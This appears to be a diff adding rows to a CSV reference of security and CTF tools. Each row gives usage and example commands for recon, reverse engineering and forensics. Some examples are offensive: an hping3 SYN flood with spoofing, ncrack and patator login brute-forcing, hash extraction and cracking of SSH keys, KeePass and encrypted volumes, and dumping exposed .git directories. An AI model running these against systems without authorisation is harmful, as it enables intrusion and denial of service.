+fierce,network,DNS reconnaissance tool,Locates non-contiguous IP space and hostnames against specified domains by bruteforcing DNS and checking for zone transfers.,"fierce [options] --domain <domain>
+Options:
+  --domain: Target domain
+  --subdomain-file: Wordlist
+  --dns-servers: Custom DNS
+  --threads: Thread count","fierce --domain target.com
+fierce --domain target.com --subdomain-file subs.txt"
+fping,network,Fast parallel ping utility,Sends ICMP echo requests to multiple hosts simultaneously. Much faster than ping for scanning ranges.,"fping [options] <targets>
+Options:
+  -a: Show alive hosts
+  -g: Generate target list from range
+  -q: Quiet (summary only)
+  -c: Count","fping -a -g 192.168.1.0/24
+fping -aq 192.168.1.1 192.168.1.2
+fping -g 192.168.1.1 192.168.1.254"
+ghidra,reversing,NSA reverse engineering framework,"Software reverse engineering framework developed by NSA. Features disassembler, decompiler, scripting, and collaborative analysis.","ghidraRun [options]
+Or use headless mode:
+analyzeHeadless <project_dir> <project_name> -import <file>","ghidraRun
+analyzeHeadless /tmp ghidra_proj -import binary -postScript analyze.py"
+git,general,Version control system,"Distributed version control system. In CTF context, useful for finding exposed .git directories and extracting source code.","git [command] [options]
+Commands:
+  clone: Clone repository
+  log: View history
+  diff: Show changes
+  checkout: Switch branches","git clone http://target.com/.git
+git log --oneline
+git diff HEAD~5
+git checkout HEAD -- .
+wget -r http://target.com/.git/"
+gpg,crypto,GNU Privacy Guard encryption,Encrypts and signs data using OpenPGP standard. Manages keys and can decrypt encrypted messages or files.,"gpg [options] <file>
+Options:
+  -d: Decrypt
+  -c: Symmetric encrypt
+  --import: Import key
+  --export: Export key
+  --list-keys: Show keys","gpg -d encrypted.gpg
+gpg -c secret.txt
+gpg --import pubkey.asc
+gpg --decrypt message.asc"
+gpg2john,password,Extract GPG private key hashes,Extracts password hashes from GPG private keys for cracking with John the Ripper.,gpg2john <private_key> > hash.txt,"gpg2john privkey.asc > gpg_hash.txt
+john --wordlist=rockyou.txt gpg_hash.txt"
+hash-identifier,password,Identify hash types,Identifies the type of hash provided. Similar to hashid but uses different identification method.,"hash-identifier
+Then paste hash interactively","hash-identifier
+> 5d41402abc4b2a76b9719d911017c592"
+hping3,network,TCP/IP packet assembler and analyzer,"Network tool for crafting and sending custom TCP/IP packets. Useful for firewall testing, port scanning, and network testing.","hping3 [options] <host>
+Options:
+  -S: SYN flag
+  -p: Destination port
+  -c: Packet count
+  --flood: Send packets fast
+  -a: Spoof source IP","hping3 -S -p 80 target.com
+hping3 -S -p 80 -c 3 target.com
+hping3 --flood -S -p 80 target.com"
+ike-scan,network,IKE/IPsec VPN scanner,Discovers and fingerprints IKE hosts (VPN servers). Tests for aggressive mode vulnerabilities.,"ike-scan [options] <targets>
+Options:
+  -M: Multiline mode
+  -A: Aggressive mode
+  --id: Set identification
+  -P: Save PSK to file","ike-scan 192.168.1.1
+ike-scan -M -A 192.168.1.1
+ike-scan -A --id=vpn 192.168.1.0/24"
+jq,general,JSON processor and query tool,"Lightweight JSON processor for parsing, filtering, and transforming JSON data from command line.","jq [options] <filter> [file]
+Filters:
+  .: Identity
+  .field: Extract field
+  .field.subfield: Nested
+  .[]: Array elements
+  select(): Filter","cat data.json | jq .
+jq '.users[0].name' data.json
+jq '.[] | select(.id > 5)' data.json
+curl api.example.com | jq '.results'"
+keepass2john,password,Extract KeePass database hashes,Extracts password hashes from KeePass .kdbx database files for cracking with John the Ripper.,keepass2john <database.kdbx> > hash.txt,"keepass2john passwords.kdbx > keepass_hash.txt
+john --wordlist=rockyou.txt keepass_hash.txt"
+luks2john,password,Extract LUKS encryption hashes,Extracts password hashes from LUKS encrypted volumes for cracking with John the Ripper.,luks2john <device_or_image> > hash.txt,"luks2john encrypted.img > luks_hash.txt
+john --wordlist=rockyou.txt luks_hash.txt"
+nano,general,Simple text editor,Easy-to-use terminal text editor. Useful for editing scripts and configuration files during CTF challenges.,"nano [options] <file>
+Commands (Ctrl+):
+  O: Save
+  X: Exit
+  W: Search
+  K: Cut line","nano script.py
+nano /etc/hosts"
+nbtscan,network,NetBIOS name scanner,Scans IP networks for NetBIOS name information. Discovers Windows hosts and their shares.,"nbtscan [options] <target>
+Options:
+  -r: Use local port 137
+  -v: Verbose
+  -h: Human readable","nbtscan 192.168.1.0/24
+nbtscan -r 192.168.1.0/24
+nbtscan -v 192.168.1.100"
+ncrack,password,High-speed network authentication cracker,"Fast network authentication cracking tool from Nmap project. Supports many protocols including SSH, RDP, FTP, HTTP.","ncrack [options] <service://target>
+Options:
+  -U: Username file
+  -P: Password file
+  -u: Single username
+  -p: Single password
+  --user: Username","ncrack ssh://192.168.1.100 -U users.txt -P passwords.txt
+ncrack rdp://target.com -u admin -P passwords.txt
+ncrack ftp://192.168.1.100 -U users.txt -P pass.txt"
+netdiscover,network,Active/passive ARP reconnaissance,Discovers hosts on network using ARP requests. Can run in passive mode to sniff ARP traffic.,"netdiscover [options]
+Options:
+  -i: Interface
+  -r: IP range
+  -p: Passive mode
+  -c: Count","netdiscover -i eth0
+netdiscover -r 192.168.1.0/24
+netdiscover -p -i eth0"
+nping,network,Network packet generation tool,Nmap's packet generation tool. Creates custom packets for network testing and analysis.,"nping [options] <targets>
+Options:
+  --tcp: TCP mode
+  --udp: UDP mode
+  --icmp: ICMP mode
+  -p: Port
+  -c: Count
+  --flags: TCP flags","nping --tcp -p 80 target.com
+nping --icmp -c 5 192.168.1.1
+nping --tcp --flags SYN -p 22 target.com"
+office2john,password,Extract Office document hashes,Extracts password hashes from password-protected Microsoft Office documents for cracking.,office2john <document> > hash.txt,"office2john protected.docx > office_hash.txt
+john --wordlist=rockyou.txt office_hash.txt"
+onesixtyone,network,Fast SNMP community string scanner,Fast SNMP scanner for discovering community strings. Uses multiple threads for speed.,"onesixtyone [options] <target>
+Options:
+  -c: Community string file
+  -i: Target file
+  -o: Output file","onesixtyone 192.168.1.100 public
+onesixtyone -c community.txt 192.168.1.100
+onesixtyone -c community.txt -i hosts.txt"
+patator,password,Multi-purpose brute-forcer,Flexible brute-forcing tool supporting many protocols and services. Modular design allows custom attacks.,"patator <module> <options>
+Modules:
+  ftp_login, ssh_login, http_fuzz
+  mysql_login, pgsql_login
+  smtp_login, pop_login","patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt
+patator http_fuzz url=http://target.com/login method=POST body='user=admin&pass=FILE0' 0=passwords.txt"
+pdf2john,password,Extract PDF password hashes,Extracts password hashes from encrypted PDF files for cracking with John the Ripper.,pdf2john <file.pdf> > hash.txt,"pdf2john protected.pdf > pdf_hash.txt
+john --wordlist=rockyou.txt pdf_hash.txt"
+putty2john,password,Extract PuTTY private key hashes,Extracts password hashes from PuTTY private key files (.ppk) for cracking.,putty2john <key.ppk> > hash.txt,"putty2john private.ppk > putty_hash.txt
+john --wordlist=rockyou.txt putty_hash.txt"
+r2,reversing,Radare2 shorthand command,"Alias for radare2, the reverse engineering framework. Provides disassembly, debugging, and binary analysis.","r2 [options] <file>
+Options:
+  -A: Analyze on load
+  -d: Debug mode
+  -w: Write mode","r2 ./binary
+r2 -A ./binary
+r2 -d ./binary"
+rabin2,reversing,Binary information extractor,"Part of radare2 suite. Extracts information from binaries: symbols, imports, exports, strings, sections.","rabin2 [options] <file>
+Options:
+  -I: Binary info
+  -i: Imports
+  -E: Exports
+  -z: Strings
+  -S: Sections","rabin2 -I ./binary
+rabin2 -z ./binary
+rabin2 -i ./binary"
+radiff2,reversing,Binary diffing tool,"Part of radare2 suite. Compares two binaries at different levels: bytes, basic blocks, or functions.","radiff2 [options] <file1> <file2>
+Options:
+  -A: Analyze for differences
+  -C: Code diffing
+  -g: Graph diff","radiff2 old_binary new_binary
+radiff2 -A original patched"
+rar2john,password,Extract RAR archive hashes,Extracts password hashes from encrypted RAR archives for cracking with John the Ripper.,rar2john <archive.rar> > hash.txt,"rar2john encrypted.rar > rar_hash.txt
+john --wordlist=rockyou.txt rar_hash.txt"
+screen,general,Terminal multiplexer,Terminal multiplexer allowing multiple terminal sessions in one window. Useful for maintaining persistent sessions.,"screen [options]
+Options:
+  -S: Session name
+  -r: Reattach
+  -ls: List sessions
+Commands (Ctrl+a):
+  c: New window
+  d: Detach","screen -S ctf
+screen -r ctf
+screen -ls"
+seclists,general,Security wordlist collection path,"Collection of wordlists for security testing. Includes usernames, passwords, URLs, fuzzing patterns, and more. Located at /usr/share/seclists/","Path: /usr/share/seclists/
+Subdirectories:
+  Passwords/: Password lists
+  Usernames/: Username lists
+  Discovery/: Web/DNS discovery
+  Fuzzing/: Fuzzing payloads","ls /usr/share/seclists/Passwords/
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://target.com"
+skipfish,web,Web application security scanner,Active web application security reconnaissance tool from Google. Performs comprehensive crawling and security testing.,"skipfish [options] -o <output_dir> <url>
+Options:
+  -o: Output directory
+  -S/-W: Wordlists
+  -I: Only test path
+  -X: Exclude path","skipfish -o /tmp/results http://target.com
+skipfish -S /usr/share/skipfish/dictionaries/complete.wl -o results http://target.com"
+sleuthkit,forensics,Disk forensic analysis toolkit,Collection of command-line tools for filesystem forensics. Analyzes disk images and file systems.,"Tools include:
+  mmls: Partition layout
+  fls: List files/directories
+  icat: Extract file by inode
+  fsstat: Filesystem info
+  blkcat: Display blocks","mmls disk.img
+fls -r disk.img
+icat disk.img 65 > extracted_file
+fsstat disk.img"
+sqlmapapi,web,SQLMap REST API server,RESTful API server for SQLMap. Allows programmatic control of SQL injection testing.,"sqlmapapi.py [options]
+Options:
+  -s: Start server
+  -c: Client mode
+  -H: Host
+  -p: Port","sqlmapapi.py -s
+sqlmapapi.py -s -H 0.0.0.0 -p 8775"
+ssh2john,password,Extract SSH private key hashes,Extracts password hashes from encrypted SSH private keys for cracking with John the Ripper.,ssh2john <private_key> > hash.txt,"ssh2john id_rsa > ssh_hash.txt
+john --wordlist=rockyou.txt ssh_hash.txt"
+sublist3r,network,Fast subdomain enumeration,Python tool for enumerating subdomains using search engines and other online sources.,"sublist3r [options] -d <domain>
+Options:
+  -d: Domain
+  -o: Output file
+  -b: Enable bruteforce
+  -t: Threads
+  -e: Engines","sublist3r -d target.com
+sublist3r -d target.com -o subs.txt
+sublist3r -d target.com -b"
+tmux,general,Terminal multiplexer,Terminal multiplexer for managing multiple terminal sessions. More modern alternative to screen.,"tmux [command]
+Commands:
+  new -s <name>: New session
+  attach -t <name>: Attach
+  ls: List sessions
+Keys (Ctrl+b):
+  c: New window
+  d: Detach
+  %: Split horizontal","tmux new -s ctf
+tmux attach -t ctf
+tmux ls"
+truecrypt2john,password,Extract TrueCrypt volume hashes,Extracts password hashes from TrueCrypt/VeraCrypt encrypted volumes for cracking.,truecrypt2john <volume> > hash.txt,"truecrypt2john encrypted_volume > tc_hash.txt
+john --wordlist=rockyou.txt tc_hash.txt"
+vim,general,Advanced text editor,Powerful modal text editor. More features than nano but steeper learning curve.,"vim [options] <file>
+Modes:
+  i: Insert mode
+  Esc: Normal mode
+  :: Command mode
+Commands:
+  :w: Save
+  :q: Quit
+  /: Search","vim script.py
+vim -R file.txt  # Read-only"
+volatility3,forensics,Memory forensics framework,"Advanced memory forensics framework for analyzing RAM dumps. Extracts processes, network connections, credentials, and more.","vol3 [options] -f <memory_dump> <plugin>
+Common plugins:
+  windows.pslist: List processes
+  windows.pstree: Process tree
+  windows.netscan: Network connections
+  windows.hashdump: Extract hashes","vol3 -f memory.dmp windows.pslist
+vol3 -f memory.dmp windows.netscan
+vol3 -f memory.dmp windows.hashdump"
+wordlists,general,Common wordlist location path,Directory containing various wordlists for security testing. Points to /usr/share/wordlists/ on Kali.,"Path: /usr/share/wordlists/
+Common lists:
+  rockyou.txt: Passwords
+  dirb/common.txt: Web directories
+  dirbuster/: Web directories
+  fasttrack.txt: Quick passwords","ls /usr/share/wordlists/
+cat /usr/share/wordlists/rockyou.txt | head"
+zip2john,password,Extract ZIP archive hashes,Extracts password hashes from encrypted ZIP archives for cracking with John the Ripper.,zip2john <archive.zip> > hash.txt,"zip2john encrypted.zip > zip_hash.txt
+john --wordlist=rockyou.txt zip_hash.txt"
